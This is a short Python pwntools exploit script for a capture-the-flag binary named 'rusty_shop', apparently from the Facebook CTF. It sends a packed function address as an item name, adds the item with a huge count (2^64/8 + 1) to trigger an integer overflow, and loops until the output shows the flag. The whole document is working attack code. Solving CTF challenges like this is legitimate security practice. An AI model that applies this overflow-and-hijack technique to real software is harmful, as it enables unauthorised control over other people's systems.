from pwn import *

#context.log_level = 'debug'
count = 0x10000000000000000/8 + 1

pwin = 0x701e40
check=''

while 'fb' not in check:
    #p = remote("challenges.fbctf.com",1342)
    p = process("./rusty_shop")

    p.sendlineafter("6","1")
    p.sendlineafter("Name",p64(pwin))
    p.sendlineafter("Desc","ATTACK")
    p.sendlineafter("Price","1")
    p.sendlineafter("6","4")
    p.sendlineafter("add","1")
    p.sendlineafter("Count",str(count))
    p.sendlineafter("6","6")

    check = p.recvall()
    print check